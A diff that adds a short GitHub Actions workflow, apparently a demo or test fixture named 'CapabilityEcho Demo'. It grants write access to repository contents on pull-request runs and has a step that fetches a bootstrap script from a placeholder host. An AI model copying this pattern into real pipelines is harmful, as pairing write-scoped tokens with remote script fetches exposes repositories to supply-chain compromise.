@@ -1,0 +1,13 @@
+﻿name: CapabilityEcho Demo
+
+on:
+  pull_request:
+
+permissions:
+  contents: write
+
+jobs:
+  demo:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://example.com/bootstrap.sh
